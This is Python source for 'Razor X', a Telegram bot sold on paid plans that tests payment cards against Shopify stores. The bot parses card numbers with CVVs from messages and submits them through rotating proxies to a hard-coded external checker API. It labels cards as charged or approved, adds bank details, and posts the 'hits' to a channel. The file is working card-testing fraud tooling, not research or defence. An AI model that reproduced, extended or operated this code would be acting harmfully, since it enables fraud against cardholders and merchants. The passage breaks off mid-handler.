# 𝙍𝘼𝙕𝙊𝙍 𝙓 𝘽𝙤𝙩
from telethon.errors import FloodWaitError
from telethon import TelegramClient, events, Button
from telethon.tl.types import MessageEntityCustomEmoji, ChannelParticipantBanned
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.extensions import html as thtml
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import string
import logging
import io
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote

# حاول استدعاء psutil لمراقبة النظام (إن لم يتوفر لن يتوقف البوت)
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

from database2 import (
    init_db, ensure_user, get_user_plan, set_user_plan,
    is_premium_user, is_banned_user, get_all_user_proxies,
    get_proxy_count, add_proxy_db, remove_proxy_by_index,
    clear_all_proxies, is_user_marked_joined, mark_user_joined,
    remove_joined_mark, get_total_users, get_premium_count
)

# ====================== CONFIG ======================
API_ID = int(os.getenv('API_ID', 0))
API_HASH = os.getenv('API_HASH', '').strip()
BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()

client = TelegramClient('razor_x_bot', API_ID, API_HASH)
client_instance = client

_admin_env = os.getenv("ADMIN_ID", "8879293808")
try: ADMIN_ID = [int(x.strip()) for x in _admin_env.split(",") if x.strip()]
except: ADMIN_ID = [8879293808]

HIT_CHANNEL_ID = int(os.getenv("ID_HIT_CHANNEL", 0))
JOIN_GROUP_ID = int(os.getenv("JOIN_GROUP_ID", 0))
JOIN_CHANNEL_ID = int(os.getenv("JOIN_CHANNEL_ID", 0))
JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "https://t.me/jonvhddrrd")
JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "https://t.me/hgffrrddrddf")

# --- الإعدادات الصحيحة للـ API والملفات ---
CHECKER_API_URL = 'http://62.72.20.10:8081/'
PROXY_FILE = 'proxy.txt'

# 👇 ضع رابط ملف الـ sites.txt الخاص بك على جيتهب (يجب أن يكون بصيغة RAW) 👇
GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/username/repo/main/sites.txt")

SP_PER_USER_WORKERS = 30
WORKERS = 70  # سرعة الفحص الجماعي
PROXY_PER_USER_WORKERS = 50
BIN_WORKERS = 20

API_TIMEOUT = 30
BIN_TIMEOUT = 15
PROXY_TIMEOUT = 15
DELAY = 0.05
HIT_DELAY = 1.0
FREE_SP_DAILY_LIMIT = 15
FREE_SP_COOLDOWN = 10
LOG_CHANNEL_ID = HIT_CHANNEL_ID

PLANS = {
    "plan1": {"name": "Core Access", "tier": "Core", "duration_days": 7, "emoji": "🛠️", "price": "$8.00"},
    "plan2": {"name": "Elite Access", "tier": "Elite", "duration_days": 15, "emoji": "👑", "price": "$14.00"},
    "plan3": {"name": "Root Access", "tier": "Root", "duration_days": 30, "emoji": "⭐", "price": "$25.00"},
    "plan4": {"name": "X-Access", "tier": "X", "duration_days": 90, "emoji": "💎", "price": "$60.00"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X"]

CE = {
    "crown": 5039727497143387500, "bolt": 5042334757040423886, "brain": 5040030395416969985, 
    "shield": 5042328396193864923, "star": 5042176294222037888, "gem": 5042050649248760772, 
    "check": 5039793437776282663, "fire": 5039644681583985437, "party": 5039778134807806727,
    "search": 5039649904264217620, "chart": 5042290883949495533, "pin": 5039600026809009149, 
    "joker": 5039998939076494446, "plus": 5039891861246838069, "cross": 5040042498634810056, 
    "info": 5042306247047513767, "gift": 5041975203853239332, "eyes": 5039623284056917259, 
    "trash": 5039614900280754969, "tick": 5039844895779455925, "stop": 5039671744172917707, 
    "warn": 5039665997506675838, "link": 5042101437237036298, "globe": 5042186567783809934, 
    "declined": 4956612582816351459
}
PE = "⭐"

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:','handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'proxy dead', 'proxy error', 'proxy connection', 'bad proxy',
    'connection timeout failed', 'connection timeout', 'proxy timeout',
    'session_error', 'session error', 'session_expired', 'session expired'
)

# --- صور GIF الأنمي للصيدات ---
ANIME_GIFS = [
    "https://media.giphy.com/media/1n4iuWZFnTeN6qvdpD/giphy.gif",
    "https://media.giphy.com/media/11KzOet1ElBDz2/giphy.gif",
    "https://media.giphy.com/media/4ilFRqgbzbx4c/giphy.gif",
    "https://media.giphy.com/media/xT1R9yebNpKAAJjH0s/giphy.gif",
    "https://media.giphy.com/media/108BDeJ2BvtZRu/giphy.gif",
    "https://media.giphy.com/media/F3uJq1J1x0u6k/giphy.gif",
    "https://media.giphy.com/media/7ZjnR6t2kU2lO/giphy.gif"
]

# ====================== LOCAL DB HELPERS ======================
DB_LOCK_MAIN = asyncio.Lock()

async def save_card_to_db(card, status, response, gateway, price):
    async with DB_LOCK_MAIN:
        try:
            if not os.path.exists("database.json"): return
            async with aiofiles.open("database.json", "r", encoding="utf-8") as f:
                data = json.loads(await f.read())
            if "cards" not in data: data["cards"] = []
            data["cards"].append({
                "card": card, "status": status, "response": response,
                "gateway": gateway, "price": price,
                "date": datetime.utcnow().isoformat()
            })
            async with aiofiles.open("database.json", "w", encoding="utf-8") as f:
                await f.write(json.dumps(data, indent=4))
        except Exception: pass

# ====================== GITHUB SITES FETCHER ======================
_CACHED_SITES = []
_LAST_SITES_FETCH = 0

async def get_github_sites():
    global _CACHED_SITES, _LAST_SITES_FETCH
    now = time.time()
    if _CACHED_SITES and (now - _LAST_SITES_FETCH < 600):
        return _CACHED_SITES
        
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(GITHUB_SITES_URL, timeout=10) as r:
                if r.status == 200:
                    text = await r.text()
                    sites = []
                    for line in text.split('\n'):
                        site = line.strip()
                        if site:
                            site = re.sub(r'^https?://', '', site).rstrip('/')
                            sites.append(site)
                    if sites:
                        _CACHED_SITES = list(set(sites))
                        _LAST_SITES_FETCH = now
    except Exception: pass
    
    if not _CACHED_SITES and os.path.exists('sites.txt'):
        try:
            with open('sites.txt', 'r', encoding='utf-8') as f:
                _CACHED_SITES = list(set([re.sub(r'^https?://', '', line.strip()).rstrip('/') for line in f if line.strip()]))
        except: pass
        
    return _CACHED_SITES

# ====================== UTILITIES ======================
log = logging.getLogger("RazorX")
log.setLevel(logging.INFO)

async def fetch_random_gif():
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(random.choice(ANIME_GIFS), timeout=5) as r:
                if r.status == 200:
                    b = io.BytesIO(await r.read())
                    b.name = 'hit.gif'
                    return b
    except: pass
    return None

ACTIVE_MTXT_PROCESSES = {}
USER_APPROVED_PREF = {}
_FREE_SP_USAGE = {}
_FREE_SP_LAST_USE = {}
HIT_BUTTON = [[Button.url("Razor X", "https://t.me/Razor_x_1998_bot")]]
BOT_START_TIME = time.time()

# ====================== HTTP SESSIONS ======================
_USER_HTTP_SESSIONS = {}
_BIN_SEM = asyncio.Semaphore(BIN_WORKERS)

async def get_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
    session = _USER_HTTP_SESSIONS.get(key)
    if session is None or session.closed:
        connector = aiohttp.TCPConnector(limit=0, ssl=False, force_close=False)
        session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=API_TIMEOUT), connector=connector)
        _USER_HTTP_SESSIONS[key] = session
    return session

async def cleanup_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
    session = _USER_HTTP_SESSIONS.pop(key, None)
    if session and not session.closed:
        try: await session.close()
        except: pass

# ====================== EXTRACTION ======================
def extract_cc(text):
    if not text: return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2: y = '20' + y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text): cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text): cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))

def get_txt_proxies():
    if not os.path.exists(PROXY_FILE): return []
    try:
        with open(PROXY_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception: return []

# ====================== CHECKERS (THE REAL API) ======================
def is_dead_site_error(error_msg):
    if not error_msg: return True
    return any(keyword in str(error_msg).lower() for keyword in _DEAD_INDICATORS)

async def get_bin_info(cn):
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(f'https://bins.antipublic.cc/bins/{cn[:6]}', timeout=10) as r:
                if r.status != 200: return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
                d = await r.json(content_type=None)
                return {
                    "brand": str(d.get('brand', '-')), 
                    "type": str(d.get('type', '-')), 
                    "level": str(d.get('level', '-')), 
                    "bank": str(d.get('bank', '-')), 
                    "country": str(d.get('country_name', '-')), 
                    "flag": str(d.get('country_flag', '🏳️'))
                }
    except: return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}

async def check_card_api(card, site, proxy, session):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card, 'proxy': proxy}

        params = {'cc': card, 'url': site, 'proxy': proxy}
        
        async with session.get(CHECKER_API_URL, params=params) as resp:
            raw = await resp.json(content_type=None)

        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        gate = raw.get('Gate', 'Shopify')
        status = raw.get('Status', '')

        if is_dead_site_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price, 'proxy': proxy}

        response_lower = str(response_msg).lower()

        if status == 'Charged' or 'order completed' in response_lower or '💎' in response_msg:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price, 'proxy': proxy}
        elif 'cloudflare bypass failed' in response_lower:
            return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gate, 'price': price, 'proxy': proxy}
        elif 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price, 'proxy': proxy}
        elif status == 'Approved' or any(key in response_lower for key in [
            'approved', 'success', 'insufficient_funds', 'insufficient funds',
            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
            'incorrect_zip', 'incorrect zip'
        ]):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price, 'proxy': proxy}
        else:
            if any(k in response_lower for k in ['proxy', 'timeout', 'error', 'session', 'failed']):
                return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price, 'proxy': proxy}
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price, 'proxy': proxy}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True, 'proxy': proxy}
    except Exception as e:
        return {'status': 'Site Error', 'message': f'API Error', 'card': card, 'retry': True, 'proxy': proxy}

async def check_card_with_retry(card, sites, proxies, session, max_retries=3):
    last_result = None
    if not sites: return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    
    available_proxies = list(proxies) if proxies else [None]

    for attempt in range(max_retries):
        if not available_proxies: available_proxies = list(proxies) if proxies else [None]
        site = random.choice(sites)
        proxy = random.choice(available_proxies)
        
        result = await check_card_api(card, site, proxy, session)
        if not result.get('retry'): return result

        last_result = result
        msg_lower = str(result.get('message', '')).lower()

        if proxy and any(x in msg_lower for x in ['proxy dead', 'proxy error', 'timeout', 'bad proxy', 'connection timeout']):
            if proxy in available_proxies: available_proxies.remove(proxy)

        if attempt < max_retries - 1:
            await asyncio.sleep(DELAY) 

    if last_result:
        return {'status': 'Dead', 'message': f'API Congested/Proxy Failed: {str(last_result["message"])[:30]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-')}
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}

# ====================== UI / MESSAGES ======================
def build_entities(html_text, emoji_ids=None):
    try:
        text, entities = thtml.parse(html_text)
        if emoji_ids:
            idx, utf16_pos = 0, 0
            for ch in text:
                if ch == PE and idx < len(emoji_ids):
                    entities.append(MessageEntityCustomEmoji(offset=utf16_pos, length=1, document_id=emoji_ids[idx]))
                    idx += 1
                utf16_pos += 2 if ord(ch) > 0xFFFF else 1
        return text, sorted(entities, key=lambda e: e.offset)
    except: return html_text, []

async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await event.reply(text, formatting_entities=entities, buttons=buttons, file=file if file else None, link_preview=False)
    except Exception:
        try: return await event.reply(html_text[:4000], parse_mode='html', buttons=buttons, file=file, link_preview=False)
        except: return None

async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await client_instance.send_message(chat_id, text, formatting_entities=entities, buttons=buttons, file=file if file else None, link_preview=False)
    except: 
        try: return await client_instance.send_message(chat_id, html_text[:4000], parse_mode='html', buttons=buttons, file=file, link_preview=False)
        except: return None

async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        await msg.edit(text, formatting_entities=entities, buttons=buttons, link_preview=False)
    except: pass

def pbtn(text, data=None, url=None):
    if url: return Button.url(text, url)
    if data: return Button.inline(text, data.encode() if isinstance(data, str) else data)
    return Button.inline(text, b"none")

def format_card_result(status, card, gateway, response, price="-", bin_info=None, elapsed=0.0):
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    ps = f"${str(price).replace('$', '')}" if price and price != "-" else "-"
    
    if status == "Charged":
        header = f"<b>✅ CHARGED</b> {PE}"
        emoji_id = [CE["fire"]]
    elif status == "Approved":
        header = f"<b>⚡ APPROVED</b> {PE}"
        emoji_id = [CE["check"]]
    elif status == "Dead":
        header = f"<b>❌ DECLINED</b> {PE}"
        emoji_id = [CE["declined"]]
    else:
        header = f"<b>⚠️ ERROR</b> {PE}"
        emoji_id = [CE["cross"]]

    return f"""{header}
━━━━━━━━━━━━━━━━━
<blockquote>💳 <b>Card:</b> <code>{card}</code>
💬 <b>Response:</b> <code>{response}</code>
🌐 <b>Gateway:</b> <code>{gateway}</code>
💲 <b>Price:</b> <code>{ps}</code></blockquote>
━━━━━━━━━━━━━━━━━
🏦 <b>Bank:</b> <code>{bi.get('bank', '-')}</code>
🌍 <b>Country:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>
🏢 <b>Type:</b> <code>{bi.get('brand', '-')} - {bi.get('type', '-')} - {bi.get('level', '-')}</code>
⏱ <b>Took:</b> <code>{elapsed:.2f}s</code>""", emoji_id

async def send_channel_hit(result, uid, username, name, gateway, status):
    if not HIT_CHANNEL_ID: return
    try:
        card = result.get("card", "")
        resp = result.get("message", "")
        price = result.get("price", "-")
        bi = await get_bin_info(card.split("|")[0])
        msg, eid = format_card_result(status, card, gateway, resp, price, bi, 0.0)
        msg += f"\n\n👤 <b>User:</b> <a href='tg://user?id={uid}'>{name}</a> (<code>{username}</code>)"
        await styled_send(HIT_CHANNEL_ID, msg, emoji_ids=eid, buttons=HIT_BUTTON)
    except: pass

# ====================== MIDDLEWARES ======================
async def is_user_joined(user_id):
    if user_id in ADMIN_ID: return True
    for cid in [JOIN_GROUP_ID, JOIN_CHANNEL_ID]:
        if cid == 0: continue
        try:
            r = await client_instance(GetParticipantRequest(channel=cid, participant=user_id))
            if isinstance(r.participant, ChannelParticipantBanned): return False
        except: pass
    return True

async def force_join_check(event):
    if event.sender_id in ADMIN_ID: return True
    if await is_user_joined(event.sender_id): return True
    buttons = [[pbtn("Join Channel", url=JOIN_CHANNEL_LINK)], [pbtn("Join Group", url=JOIN_GROUP_LINK)], [pbtn("I have joined", data="check_joined")]]
    text = f"""{PE} <b>Access Locked</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>Join Both Chats to Unlock</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>Channel:</b> <i>RAZOR X CHANNEL</i>\n{PE} <b>Group:</b> <i>RAZOR X Chat</i>\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>All Features Restricted</b>"""
    await styled_reply(event, text, buttons=buttons, emoji_ids=[CE["fire"], CE["fire"], CE["stop"], CE["link"], CE["info"], CE["warn"]])
    return False

async def can_use(user_id, chat):
    await ensure_user(user_id)
    if await is_banned_user(user_id): return False, "banned"
    plan = (await get_user_plan(user_id)).title()
    return True, f"{plan}_private" if chat.id == user_id else f"{plan}_group"

def get_cc_limit(plan, uid=None):
    if uid and uid in ADMIN_ID: return 10000
    p = plan.title() if plan else "Bronze"
    if p == "X": return 10000
    if p == "Root": return 5000
    if p == "Elite": return 2500
    if p == "Core": return 1500
    return 0

def is_paid_plan(plan): return plan.title() in PAID_TIERS if plan else False

def banned_user_message():
    return f"""{PE} <b>Banned</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>Not allowed</b>\n{PE} <b>Appeal:</b> <i>Contact Admin</i>""", [CE["stop"], CE["stop"], CE["warn"], CE["info"]]

async def send_premium_only_message(event):
    return await styled_reply(event, f"""{PE} <b>Premium Only</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>This feature requires an active plan</b>\n{PE} <i>Use /plan to see available plans</i>""", buttons=[[pbtn("Upgrade", url="https://t.me/Dddadddyttt")]], emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["info"]])

async def send_group_only_message(event):
    return await styled_reply(event, f"""{PE} <b>Group Only</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>Free users → group only</b>\n{PE} <i>Upgrade for private access</i>""", emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["gem"]])

async def _check_free_limits(event, uid, plan, is_group):
    if uid in ADMIN_ID: return True
    if not is_paid_plan(plan):
        if not is_group: await send_group_only_message(event); return False
        used = get_free_sp_usage(uid)
        if used >= FREE_SP_DAILY_LIMIT:
            await styled_reply(event, f"{PE} <b>Daily Limit</b> {used}/{FREE_SP_DAILY_LIMIT}", buttons=[[pbtn("Upgrade", url="https://t.me/Dddadddyttt")]], emoji_ids=[CE["stop"]])
            return False
        cd = get_free_sp_cooldown_remaining(uid)
        if cd > 0:
            await styled_reply(event, f"⚠️ <b>Wait {cd}s</b>", buttons=[[pbtn("Upgrade", url="https://t.me/Dddadddyttt")]])
            return False
    return True

# ====================== COMMANDS ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    try:
        await ensure_user(event.sender_id)
        if not await force_join_check(event): return
        uid = event.sender_id
        is_allowed, at = await can_use(uid, event.chat)
        if at == "banned":
            t, e = banned_user_message()
            return await styled_reply(event, t, emoji_ids=e)
            
        plan = await get_user_plan(event.sender_id)
        limit = get_cc_limit(plan, event.sender_id)
        if is_paid_plan(plan):
            plan_emoji = "🛠️"
            for pi in PLANS.values():
                if pi["tier"].lower() == plan.lower(): plan_emoji = pi["emoji"]; break
            sl = f"{PE} <b>STATUS</b> ━ {plan_emoji} <b>{plan.upper()}</b> {PE} (<code>{limit}</code> Mass Limit)"
            se = [CE["star"], CE["crown"]]
        else:
            sl = f"<b>STATUS</b> ━ 🆓 <b>{plan.upper()}</b> (<code>{FREE_SP_DAILY_LIMIT}/day</code> in group)"
            se = []
            
        text = f"""{PE} <b><i>Shopify Checker</i></b>
|   {PE} <code>/sp</code> ━ <b>Single CC</b>
|   {PE} <code>/msp</code> ━ <b>Mass CC</b>

{PE} <b><i>Proxy Config</i></b> (Private)
|   {PE} <code>/addpxy</code> ━ <b>Add</b>
|   {PE} <code>/proxy</code> ━ <b>View</b>
|   {PE} <code>/rmpxy</code> ━ <b>Remove</b>

{PE} <b><i>Account</i></b>
|   {PE} <code>/info</code> ━ <b>Profile</b>
|   {PE} <code>/plan</code> ━ <b>Plans</b>
<b>━━━━━━━━━━━━━━━━━</b>
{sl}"""
        kb = [[pbtn("💰 Plans", data="show_plans"), pbtn("👨‍💻 Support", url="https://t.me/Dddadddyttt")],
              [pbtn("📢 Channel", url=JOIN_CHANNEL_LINK), pbtn("💬 Group", url=JOIN_GROUP_LINK)]]
        ei = [CE["bolt"], CE["search"], CE["pin"], CE["fire"], CE["search"], CE["pin"], CE["brain"], CE["plus"], CE["cross"], CE["globe"], CE["link"], CE["shield"], CE["link"], CE["eyes"], CE["tick"], CE["trash"], CE["info"], CE["info"]] + se
        await styled_reply(event, text, buttons=kb, emoji_ids=ei)
    except Exception as e: await event.reply(f"⚠️ Error in /start: {e}")

@client.on(events.CallbackQuery(data=b"check_joined"))
async def check_joined_cb(event):
    uid = event.sender_id
    if uid in ADMIN_ID: return await event.answer(f"✅ Admin!", alert=True)
    if await is_user_joined(uid):
        await mark_user_joined(uid)
        await event.answer(f"✅ Verified!", alert=True)
        try: await event.delete()
        except: pass
        await styled_send(event.chat_id, f"""{PE} <b>Welcome</b> {PE}\n{PE} <code>/start</code> <b>for commands</b>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"]])
    else: await event.answer(f"❌ Not joined!", alert=True)

@client.on(events.CallbackQuery(data=b"show_plans"))
async def plans_cb(event):
    cp = await get_user_plan(event.sender_id)
    await event.answer()
    plans_text = f"""{PE} <b>Plans</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>"""
    for pid, pi in PLANS.items(): plans_text += f"\n{pi['emoji']} <b>{pi['name']}</b> ━ <b>{pi['duration_days']}d</b> ━ <b>{pi['price']}</b>"
    plans_text += f"\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>Current:</b> <b>{cp.upper()}</b>"
    await styled_send(event.chat_id, plans_text, buttons=[[pbtn("Upgrade", url="https://t.me/Dddadddyttt")]], emoji_ids=[CE["fire"], CE["fire"], CE["crown"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan$'))
async def show_plans(event):
    if not await force_join_check(event): return
    cp = await get_user_plan(event.sender_id)
    plans_text = f"""{PE} <b>Plans</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>"""
    for pid, pi in PLANS.items(): plans_text += f"\n{pi['emoji']} <b>{pi['name']}</b> ━ <b>{pi['duration_days']}d</b> ━ <b>{pi['price']}</b>"
    plans_text += f"""\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>Current:</b> <b>{cp.upper()}</b>\n{PE} <i>Contact admin</i>"""
    await styled_reply(event, plans_text, buttons=[[pbtn("Upgrade", url="https://t.me/Dddadddyttt")]], emoji_ids=[CE["fire"], CE["fire"], CE["crown"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]info$'))
async def info_cmd(event):
    try:
        if not await force_join_check(event): return
        await ensure_user(event.sender_id)
        plan = await get_user_plan(event.sender_id)
        pc = await get_proxy_count(event.sender_id)
        plan_emoji = "🆓"
        for pi in PLANS.values():
            if pi["tier"].lower() == plan.lower(): plan_emoji = pi["emoji"]; break
        
        expiry_date = None
        try:
            async with DB_LOCK_MAIN:
                with open("database.json", "r", encoding="utf-8") as f:
                    ddata = json.load(f)
                    u_doc = ddata.get("users", {}).get(str(event.sender_id), {})
                    exp_s = u_doc.get("expiry")
                    if exp_s: expiry_date = datetime.fromisoformat(exp_s)
        except: pass
        
        exp_str = expiry_date.strftime('%Y-%m-%d') if expiry_date else "Never"
        status = "Active" if is_paid_plan(plan) else "Free"
        limit_text = f"<code>{get_cc_limit(plan, event.sender_id)}</code>" if is_paid_plan(plan) else f"<code>{FREE_SP_DAILY_LIMIT}/day (group)</code>"
        used_today = get_free_sp_usage(event.sender_id)
        usage_line = f"\n{PE} <b>Used Today:</b> <code>{used_today}/{FREE_SP_DAILY_LIMIT}</code>" if not is_paid_plan(plan) and event.sender_id not in ADMIN_ID else ""
        await styled_reply(event, f"""{PE} <b>Profile</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>ID:</b> <code>{event.sender_id}</code>\n{PE} <b>Status:</b> <code>{status}</code>\n{PE} <b>Plan:</b> {plan_emoji} <b>{plan.upper()}</b>\n{PE} <b>Expiry:</b> <code>{exp_str}</code>\n{PE} <b>Limit:</b> {limit_text}{usage_line}\n{PE} <b>Proxies:</b> <code>{pc}/100</code>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["star"], CE["crown"], CE["chart"], CE["shield"]])
    except Exception as e: await event.reply(f"⚠️ Error in /info: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]addpxy'))
async def add_proxy_cmd(event):
    try:
        if not await force_join_check(event): return
        if event.is_group: return await styled_reply(event, f"{PE} <b>Private only</b>", emoji_ids=[CE["stop"]])
        plan = await get_user_plan(event.sender_id)
        if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
        lines = []
        if event.is_reply:
            rm = await event.get_reply_message()
            if rm.file:
                fp = await rm.download_media()
                if fp:
                    try:
                        async with aiofiles.open(fp, "r", encoding="utf-8") as f: lines = [l.strip() for l in (await f.read()).splitlines() if l.strip()]
                        os.remove(fp)
                    except: pass
            elif rm.text: lines = [l.strip() for l in rm.text.splitlines() if l.strip()]
        else:
            p = event.raw_text.split(maxsplit=1)
            if len(p) == 2: lines = [l.strip() for l in p[1].splitlines() if l.strip()]
            else: return await styled_reply(event, f"{PE} <code>/addpxy ip:port:user:pass</code>", emoji_ids=[CE["info"]])
        if not lines: return await styled_reply(event, f"{PE} <b>No proxies</b>", emoji_ids=[CE["cross"]])
        cc = await get_proxy_count(event.sender_id)
        if cc >= 100: return await styled_reply(event, f"{PE} <b>Limit 100/100</b>", emoji_ids=[CE["cross"]])
        
        parsed = []
        for l in lines:
            pd = parse_proxy_format(l)
            if pd: parsed.append(pd)
        if not parsed: return await styled_reply(event, f"{PE} <b>No valid proxies</b>", emoji_ids=[CE["cross"]])
        parsed = parsed[:100-cc]
        
        tm = await styled_reply(event, f"{PE} <b>Adding {len(parsed)} proxies...</b>", emoji_ids=[CE["shield"]])
        added = 0
        for pd2 in parsed:
            await add_proxy_db(event.sender_id, pd2)
            added += 1
        await styled_edit(tm, f"{PE} <b>Done! Added: {added}</b>", emoji_ids=[CE["check"]])
    except Exception as e: await event.reply(f"⚠️ Error in /addpxy: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]proxy$'))
async def view_proxies(event):
    try:
        if not await force_join_check(event): return
        if event.is_group: return await styled_reply(event, f"{PE} <b>Private only</b>", emoji_ids=[CE["stop"]])
        plan = await get_user_plan(event.sender_id)
        if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
        proxies = await get_all_user_proxies(event.sender_id)
        if not proxies: return await styled_reply(event, f"{PE} <b>No proxies</b> <code>/addpxy</code>", emoji_ids=[CE["cross"]])
        text = f"{PE} <b>Proxies</b> ({len(proxies)}/100) {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n"
        eid = [CE["fire"], CE["fire"]]
        for i, p in enumerate(proxies[:30], 1): text += f"<code>{i}.</code> {PE} <b>{p['ip']}:{p['port']}</b>\n"; eid.append(CE["link"])
        if len(proxies) > 30: text += f"\n<i>+{len(proxies)-30} more</i>"
        text += f"\n{PE} <code>/rmpxy index</code>"; eid.append(CE["trash"])
        await styled_reply(event, text, emoji_ids=eid)
    except Exception as e: await event.reply(f"⚠️ Error in /proxy: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmpxy'))
async def remove_proxy_cmd(event):
    try:
        if not await force_join_check(event): return
        if event.is_group: return await styled_reply(event, f"{PE} <b>Private only</b>", emoji_ids=[CE["stop"]])
        plan = await get_user_plan(event.sender_id)
        if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
        proxies = await get_all_user_proxies(event.sender_id)
        if not proxies: return await styled_reply(event, f"{PE} <b>No proxies</b>", emoji_ids=[CE["cross"]])
        p = event.raw_text.split(maxsplit=1)
        if len(p) == 1: return await styled_reply(event, f"{PE} <code>/rmpxy index</code> or <code>all</code>", emoji_ids=[CE["warn"]])
        arg = p[1].strip().lower()
        if arg == 'all':
            c = await clear_all_proxies(event.sender_id)
            return await styled_reply(event, f"{PE} <b>Cleared {c}</b>", emoji_ids=[CE["check"]])
